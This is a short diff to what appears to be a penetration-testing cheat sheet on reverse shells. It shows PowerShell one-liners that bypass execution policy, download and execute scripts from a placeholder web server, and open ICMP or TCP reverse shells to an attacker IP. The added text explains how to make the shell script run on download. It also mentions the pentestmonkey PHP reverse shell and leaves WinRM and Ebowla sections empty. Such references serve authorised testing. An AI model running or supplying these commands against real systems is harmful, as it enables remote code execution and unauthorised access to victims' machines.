@@ -255,6 +255,10 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
 ```
 
+The Powershell script can also be started directly upon download if the invoke
+command is added at the end of the script
+`Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>`
+
 ###### PHP
 
 The pentestmonkey php-reverse-shell PHP script is a proper interactive reverse
@@ -745,3 +749,5 @@ Press [Enter] to continue...
 ```
 
 ###### Ebowla
+
+### WinRM
